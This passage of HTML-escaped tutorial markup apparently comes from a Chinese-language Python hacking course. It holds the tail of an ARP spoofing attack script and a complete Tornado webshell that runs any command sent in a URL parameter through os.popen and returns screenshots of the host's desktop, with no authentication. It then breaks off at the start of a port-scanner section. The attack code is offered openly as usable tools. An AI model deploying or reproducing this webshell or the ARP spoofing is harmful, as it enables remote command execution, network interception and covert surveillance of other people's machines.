punctuation&#34;&gt;(&lt;/span&gt;dst&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;ff:ff:ff:ff:ff:ff&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;ARP&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;pdst&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;wg&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; psrc&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;vip&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; verbose&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;68&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;对{}的ARP攻击完成&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;vip&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;69&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;70&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;71&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 程序入口&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;72&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;73&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    scan2spoof&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;313-webshell-一招走天下&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#313-webshell-一招走天下&#34;&gt;#&lt;/a&gt; 3.13 webshell 一招走天下&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;webshell，截屏远程控制器&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;技术分解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#技术分解&#34;&gt;#&lt;/a&gt; 技术分解&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;webapp：web 应用&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;http:80/https:443/ws:80/wss:443&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;http(https)/tcp/udp/ws(wss)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;cmd/shell 等&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;html/css/js 等&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;python/asp/php/jsp 等&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;二进制等&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;流控制等&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Author       : zhong&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;since        : 2022-08-27 19:20:58&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;LastAuthor   : zhong&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;lastTime     : 2022-08-27 19:57:51&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;blog         : http://dpm12345.cn/&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;email        : 1006975692@qq.com&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39;&#39;&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# python webshell&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 步骤:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 1. 构建一款 HTTP 协议服务器&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 2. 独立开放特定端口&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 3. 构建一个视图 view (mvc)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 4. 执行 shell 命令 + 截取对方的桌面&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 引入&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# tornado 框架&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# pyautogui 截屏&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# os&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; tornado&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;web &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; RequestHandler&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; Application&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; tornado&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ioloop &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; IOLoop&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; tornado&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;options &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; options&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; parse_command_line&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; define&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; tornado&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;httpserver &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; HTTPServer&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; os&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; pyautogui&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;define&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;port&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; default&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;14444&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;help&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;这是http协议通信端口&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;RequestHandler&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# 定义获取 url 的参数&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get_query_argument&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;key&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34; &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; key &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;screenshot&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token comment&#34;&gt;# 截屏&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            img &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; pyautogui&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;screenshot&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            img&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;save&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;screenshot.jpg&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token comment&#34;&gt;# 二进制返回&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            pic &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;screenshot.jpg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;rb&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            pics &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; pic&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;pics&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;set_header&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Content-Type&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;image/png&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            res &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;popen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;key&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;r&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;makeapp&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; Application&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;r&#39;/&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; index&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    parse_command_line&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    app &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; makeapp&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 把应用部署到 httpserver&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    sever &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; HTTPServer&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;app&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    sever&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;bind&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;options&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    sever&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;start&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    IOLoop&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;current&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;start&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;314-我和你之间就差一个-python-nmap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#314-我和你之间就差一个-python-nmap&#34;&gt;#&lt;/a&gt; 3.14 我和你之间就差一个 Python-nmap&lt;/h1&gt;
&lt;p&gt;python-nmap 用的核心方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;portscanner () 终端扫描的封装&lt;/li&gt;
&lt;li&gt;portscannerhostdict () 扫描完成返回结果集&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;实现内网端口扫描工具&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Author       : zhong&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;since        : 2022-08-27 21:41:24&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;LastAuthor   : zhong&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;lastTime     : 2022-08-27 23:45:06&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;blog         : 